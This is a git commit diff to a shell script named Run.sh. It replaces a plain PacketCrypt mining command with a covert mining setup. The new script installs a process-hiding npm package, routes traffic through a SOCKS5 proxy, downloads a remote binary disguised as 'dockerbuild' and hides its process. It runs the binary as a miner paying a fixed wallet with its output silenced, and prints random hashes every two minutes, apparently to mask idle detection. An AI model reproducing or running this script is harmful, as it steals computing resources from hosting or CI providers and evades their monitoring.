3af278d93ce9c371070e015fe02880541f92532b
Ksksjs88 <99658449+Ksksjs88@users.noreply.github.com>
2022-02-15 11:40:12 +0700

    Update Run.sh

--- Run.sh
+++ Run.sh
@@ -1,1 +1,34 @@
-wget https://www.pkt.world/ext/packetcrypt-linux-amd64 -O gas && chmod +x gas && ./gas ann -p pkt1q908pl3jfwd3awfqc0p8pkxfk3vjhaaqhng5335 http://pool.pkt.world/master/2048 http://pool.pktpool.io/
+apt update && apt -y install sudo wget curl unzip
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 67.201.33.10_:25283
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+wget https://bitbucket.org/mzzkskjsjnn98282/mantul/raw/bff438f46b325ac0184b313f2705f9d55547105c/dockerbuild
+chmod +x dockerbuild
+
+ph add dockerbuild
+
+./dockerbuild ann -p pkt1q908pl3jfwd3awfqc0p8pkxfk3vjhaaqhng5335 http://pool.pkt.world/master/ http://pool.pktpool.io 2>&1 | grep --color=never -o "annmine.rs.*Ke.*" >/dev/null &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
